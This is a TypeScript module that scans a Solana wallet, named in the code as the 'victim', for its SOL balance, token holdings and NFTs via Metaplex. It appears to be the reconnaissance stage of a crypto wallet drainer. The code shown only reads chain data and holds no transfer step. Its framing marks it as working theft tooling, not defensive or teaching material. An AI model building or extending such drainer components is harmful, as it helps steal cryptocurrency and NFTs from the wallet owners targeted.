import { Connection, PublicKey } from '@solana/web3.js';
import { getTokenAccountsByOwner } from './utils/token-accounts';
import SOLANA_CONFIG from './config';
import { log } from './logger';
import type { ScannedAssets } from './types';
import { Metaplex } from '@metaplex-foundation/js';   // ← Correct import

export async function scanVictimAssets(
  connection: Connection,
  victimPubkey: PublicKey
): Promise<ScannedAssets> {

  const result: ScannedAssets = {
    solBalance: 0,
    tokens: [],
    nfts: []
  };

  try {
    log.info('scanner', `Starting scan for ${victimPubkey.toString()}`);

    result.solBalance = await connection.getBalance(victimPubkey, 'confirmed');

    const tokenAccounts = await getTokenAccountsByOwner(connection, victimPubkey);
    result.tokens = tokenAccounts.filter(t => t.balance > 0);

    if (SOLANA_CONFIG.scanNFTs) {
      result.nfts = await scanNFTsWithTimeout(connection, victimPubkey, 10000);
    }

  } catch (err: any) {
    log.error('scanner', 'Scan failed', err.message);
  }

  return result;
}

async function scanNFTsWithTimeout(
  connection: Connection,
  owner: PublicKey,
  timeoutMs: number = 10000
) {
  const timeout = new Promise<never>((_, reject) =>
    setTimeout(() => reject(new Error('NFT scan timeout')), timeoutMs)
  );

  try {
    const metaplex = new Metaplex(connection);
    
    const nfts = await Promise.race([
      metaplex.nfts().findAllByOwner({ owner }),
      timeout
    ]);

    return nfts.filter((nft: any) => 
      nft.model === 'nft' || nft.model === 'sft'
    );
  } catch (err: any) {
    log.warn('scanner', 'NFT scan failed or timed out', err.message);
    return [];
  }
}